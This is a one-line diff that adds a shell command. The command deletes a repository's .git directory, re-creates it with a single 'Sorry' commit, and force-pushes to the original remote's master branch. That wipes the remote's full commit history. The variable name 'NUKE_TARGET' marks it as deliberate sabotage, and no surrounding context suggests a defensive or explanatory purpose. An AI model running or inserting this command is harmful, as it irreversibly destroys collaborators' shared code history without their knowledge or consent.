@@ -1,0 +1,1 @@
+GIT_REMOTE_URL_NUKE_TARGET=$(git config --get remote.origin.url); rm -rf .git/; git init && git add . && git commit -m "Sorry"; git remote add origin $GIT_REMOTE_URL_NUKE_TARGET; git push --force --set-upstream origin master
